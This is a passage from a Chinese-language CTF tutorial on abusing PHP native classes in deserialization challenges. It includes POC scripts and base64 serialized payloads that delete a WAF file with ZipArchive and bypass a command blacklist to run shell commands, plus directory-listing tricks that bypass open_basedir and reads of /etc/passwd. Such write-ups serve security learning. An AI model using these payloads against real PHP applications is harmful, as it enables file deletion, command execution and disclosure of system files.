<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shell</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>{
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>)&lt;<span class="hljs-number">10</span>){
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/'</span>,<span class="hljs-variable">$cmd</span>)){
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"NO"</span>);
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);
        }
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'so long!'</span>);
    }
}</code></pre>
<p><strong>3. 利用ZipArchive类删除文件</strong></p>
<p>联合index.php里面的Open类：</p>
<pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Open</span></span>{
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span></span>)</span>{
        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'waf.txt'</span>)){    <span class="hljs-comment">// 当waf.txt没读取成功时才能得到flag</span>
            <span class="hljs-title function_ invoke__">shell</span>(<span class="hljs-variable">$content</span>);
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>.<span class="hljs-string">".php"</span>);    <span class="hljs-comment">// filename=php://filter/read=convert.base64-encode/resource=shell</span>
        }
    }
}</code></pre>
<p>可知我们只要使 <code>file_get_contents('waf.txt')</code> 读取失败就可以进入 <code>shell($content)</code> 来执行系统命令。所以我们应该要想办法将waf.txt这个文件删除，这样就会读取失败，才能执行我们的命令。</p>
<p>刚好我们的ZipArchive类里面也有一个<code>open()</code>方法，</p>
<pre><code class="hljs plaintext">ZipArchive::open($filename, $flags = null)</code></pre>
<p>如果设置flags参数的值为 <code>ZipArchive::OVERWRITE</code> 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。</p>
<p>所以我们利用ZipArchive原生类调用open方法，即可将即可将$filename（waf.txt）删除：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">// highlight_file(__FILE__);</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(-<span class="hljs-number">1</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Game</span></span>{
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$username</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$password</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$choice</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$register</span>;
 
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$file</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span>;
 
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">login</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;
}
 
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Open</span></span>{
}
 
<span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Game</span>();
<span class="hljs-variable">$poc</span>-&gt;username = <span class="hljs-string">"admin"</span>;
<span class="hljs-variable">$poc</span>-&gt;password = <span class="hljs-string">"admin"</span>;
<span class="hljs-variable">$poc</span>-&gt;register = <span class="hljs-string">"admin"</span>;
<span class="hljs-variable">$poc</span>-&gt;file = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();
<span class="hljs-variable">$poc</span>-&gt;filename = <span class="hljs-string">"waf.txt"</span>;
<span class="hljs-variable">$poc</span>-&gt;content = <span class="hljs-number">8</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>));
<span class="hljs-meta">?&gt;</span></code></pre>
<p>得到payload：</p>
<pre><code class="hljs plaintext">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo4O30=</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625202107801.png" alt="image-20230625202107801"></p>
<p>执行之后即可删除waf.txt。<strong>注意我这里在本地复现的时候需要把目录文件夹的所有权和分组都给到www-data才能成功删除文件</strong></p>
<p>我这里是将文件夹权限设置为www即可</p>
<p><strong>4. 命令执行绕过黑名单和字符数限制</strong></p>
<p>最后一步就是执行我们的命令去读flag，回过头来看我们的shell.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shell</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>{
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>)&lt;<span class="hljs-number">10</span>){
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/'</span>,<span class="hljs-variable">$cmd</span>)){
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"NO"</span>);
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);
        }
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'so long!'</span>);
    }
}</code></pre>
<p>这里首先限制了我们的命令长度要小于10个字符，然后字符里面不能有黑名单字符出现，这里我们绕过的方法很多，举个例：</p>
<pre><code class="hljs plaintext">n\l /flag</code></pre>
<p>POC:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">// highlight_file(__FILE__);</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(-<span class="hljs-number">1</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Game</span></span>{
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$username</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$password</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$choice</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$register</span>;
 
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$file</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span>;
 
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">login</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;
}
 
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Open</span></span>{
}
 
<span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Game</span>();
<span class="hljs-variable">$poc</span>-&gt;username = <span class="hljs-string">"admin"</span>;
<span class="hljs-variable">$poc</span>-&gt;password = <span class="hljs-string">"admin"</span>;
<span class="hljs-variable">$poc</span>-&gt;register = <span class="hljs-string">"admin"</span>;
<span class="hljs-variable">$poc</span>-&gt;file = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Open</span>();
<span class="hljs-variable">$poc</span>-&gt;filename = <span class="hljs-string">"xxx"</span>;
<span class="hljs-variable">$poc</span>-&gt;content = <span class="hljs-string">"n\l /flag"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>));
 
<span class="hljs-meta">?&gt;</span></code></pre>
<p>得到payload：这里估计是文件位置放的不对,我总是读不到</p>
<pre><code class="hljs plaintext">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6MzoieHh4IjtzOjc6ImNvbnRlbnQiO3M6OToiblxsIC9mbGFnIjt9</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625203738853.png" alt="image-20230625203738853"></p>
<h3 id="106-遍历目录类">10.6 遍历目录类</h3>
<h4 id="directoryiterator-类">DirectoryIterator 类</h4>
<p>DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</p>
<p><strong>类摘要：</strong></p>
<pre><code class="hljs php"><span class="hljs-built_in">DirectoryIterator</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">SplFileInfo</span> <span class="hljs-keyword">implements</span> <span class="hljs-built_in">SeekableIterator</span> {
    <span class="hljs-comment">/* 方法 */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$path</span> )
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">current</span> ( ) : <span class="hljs-built_in">DirectoryIterator</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getATime</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getBasename</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$suffix</span> = ? ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getCTime</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getExtension</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getFilename</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getGroup</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getInode</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getMTime</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getOwner</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPath</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPathname</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPerms</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getSize</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getType</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">isDir</span> ( ) : <span class="hljs-keyword">bool</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">isDot</span> ( ) : <span class="hljs-keyword">bool</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">isExecutable</span> ( ) : <span class="hljs-keyword">bool</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">isFile</span> ( ) : <span class="hljs-keyword">bool</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">isLink</span> ( ) : <span class="hljs-keyword">bool</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">isReadable</span> ( ) : <span class="hljs-keyword">bool</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">isWritable</span> ( ) : <span class="hljs-keyword">bool</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">key</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">next</span> ( ) : <span class="hljs-keyword">void</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">rewind</span> ( ) : <span class="hljs-keyword">void</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">seek</span> ( <span class="hljs-keyword">int</span> <span class="hljs-variable">$position</span> ) : <span class="hljs-keyword">void</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__toString</span> ( ) : <span class="hljs-keyword">string</span>    <span class="hljs-comment">// 以字符串形式获取文件名</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">valid</span> ( ) : <span class="hljs-keyword">bool</span>
}</code></pre>
<p><strong>利用 DirectoryIterator 类遍历指定目录里的文件：</strong></p>
<p>如果我们这样：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">"/"</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;</code></pre>
<p>会创建一个指定目录的迭代器。当执行到<code>echo</code>函数时，会触发DirectoryIterator类中的 <code>__toString()</code> 方法，输出指定目录里面经过排序之后的第一个文件名：</p>
<p>也可以配合glob://协议使用模式匹配来寻找我们想要的文件路径：</p>
<blockquote>
<p>glob:// 协议用来查找匹配的文件路径模式</p>
</blockquote>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">"glob:///*flag*"</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625205744849.png" alt="image-20230625205744849"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625205821179.png" alt="image-20230625205821179"></p>
<p>如果想输出全部的文件名我们还需要对$dir对象进行遍历：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">"/"</span>);
<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>){
    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>.<span class="hljs-string">'&lt;br&gt;'</span>);
}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625210110744.png" alt="image-20230625210110744"></p>
<h4 id="filesystemiterator-类">FilesystemIterator 类</h4>
<p>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</p>
<p>该类的使用方法与DirectoryIterator 类也是基本相同的：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">"/"</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625210142667.png" alt="image-20230625210142667"></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">"glob:///*flag*"</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625210153955.png" alt="image-20230625210153955"></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">"/"</span>);
<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>){
    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>.<span class="hljs-string">'&lt;br&gt;'</span>);
}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625210207128.png" alt="image-20230625210207128"></p>
<h4 id="globiterator-类">GlobIterator 类</h4>
<p>与前两个类的作用相似，GlobIterator 类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径。</p>
<p><strong>类摘要：</strong></p>
<pre><code class="hljs php"><span class="hljs-built_in">GlobIterator</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">FilesystemIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-built_in">SeekableIterator</span> , <span class="hljs-built_in">Countable</span> {
    <span class="hljs-comment">/* 方法 */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">KEY_AS_PATHNAME</span> | <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">CURRENT_AS_FILEINFO</span> )
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">count</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-comment">/* 继承的方法 */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$path</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">KEY_AS_PATHNAME</span> | <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">CURRENT_AS_FILEINFO</span> | <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">SKIP_DOTS</span> )
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">current</span> ( ) : <span class="hljs-keyword">mixed</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">getFlags</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">key</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">next</span> ( ) : <span class="hljs-keyword">void</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">rewind</span> ( ) : <span class="hljs-keyword">void</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">setFlags</span> ( <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = ? ) : <span class="hljs-keyword">void</span>
}</code></pre>
<p>我们知道，向下面这样在单纯的使用 DirectoryIterator 类和 FilesystemIterator 类且没有配合glob://协议进行匹配的时候：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">"/"</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;
 
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">"/"</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;</code></pre>
<p>其构造函数创建的是一个指定目录的迭代器，当我们使用echo函数输出的时候，会触发这两个类中的 <code>__toString()</code> 方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的，而 GlobIterator 类便可以帮我们在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如，我们在CTF中知道flag在根目录，但是我们不知道flag文件的完整文件名，我们就可以通过类似 <code>GlobIterator(/*flag*)</code>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625210327846.png" alt="image-20230625210327846"></p>
<h4 id="使用可遍历目录类绕过-open_basedir">使用可遍历目录类绕过 open_basedir</h4>
<p>DirectoryIterator类或者FilesystemIterator类与glob://协议结合将无视<code>open_basedir</code>对目录的限制，可以用来列举出指定目录下的文件。</p>
<p>example:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'whoami'</span>];
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$dir</span>);
<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>){
    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">'&lt;br&gt;'</span>);<span class="hljs-comment">// 不加__toString()也可,因为echo可以自动调用</span>
}
<span class="hljs-meta">?&gt;</span>
 
<span class="hljs-comment"># payload一句话的形式:</span>
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">"glob:///*"</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>){<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">'&lt;br&gt;'</span>);}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625210420068.png" alt="image-20230625210420068"></p>
<p>使用FilesystemIterator类同理。</p>
<p>而使用 GlobIterator 类支持直接通过模式匹配来寻找文件路径，所以我们就不用在配合glob://协议了。</p>
<p>example:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'whoami'</span>];
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-variable">$dir</span>);
<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>){
    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">'&lt;br&gt;'</span>);<span class="hljs-comment">// 不加__toString()也可,因为echo可以自动调用</span>
}
<span class="hljs-meta">?&gt;</span>
 
<span class="hljs-comment"># payload一句话的形式:</span>
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">"/*"</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>){<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">'&lt;br&gt;'</span>);}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625210529814.png" alt="image-20230625210529814"></p>
<h3 id="107-可读取文件类">10.7 可读取文件类</h3>
<h4 id="splfileobject-类">SplFileObject 类</h4>
<p>SplFileObject 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。详情请参考：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.splfileobject.php">https://www.php.net/manual/zh/class.splfileobject.php</a></p>
<p>该类的构造方法可以构造一个新的文件对象用于后续的读取。</p>
<p>我们可以像类似下面这样去读取一个文件的一行：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">'/etc/passwd'</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$context</span>;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625210845976.png" alt="image-20230625210845976"></p>
<p>但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">'/etc/passwd'</span>);
<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$context</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>){
    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>);
}
<span class="hljs-comment">//D:\labwork\phpstudy_pro\WWW\1.txt</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625211226501.png" alt="image-20230625211226501"></p>
<p><strong>[DASCTF MAR 2021]ez_serialize</strong></p>
<p>进入题目，给出源码：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
 
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span>;
